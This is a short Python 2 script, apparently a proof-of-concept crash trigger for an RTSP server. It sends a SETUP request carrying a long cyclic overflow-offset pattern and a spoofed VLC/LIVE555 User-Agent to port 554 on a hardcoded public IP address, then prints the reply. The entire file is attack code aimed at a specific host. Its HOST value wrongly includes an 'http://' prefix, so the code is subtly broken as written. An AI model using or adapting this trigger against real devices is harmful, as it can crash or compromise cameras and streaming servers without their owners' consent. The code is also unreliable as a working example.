import socket
 
HOST = 'http://190.96.220.246/'
PORT = 554             
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
trigger_pkt = "SETUP Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2AaLSaLS RTSP/1.0\r\n"
trigger_pkt += "CSeq: 1\r\n"
trigger_pkt += "User-Agent: VLC media player (LIVE555 Streaming Media v2010.02.10)\r\n\r\n"
print "[*] Sending trigger"
s.sendall(trigger_pkt)
data = s.recv(1024)
print '[*] Response:', repr(data), "\r\n"
s.close()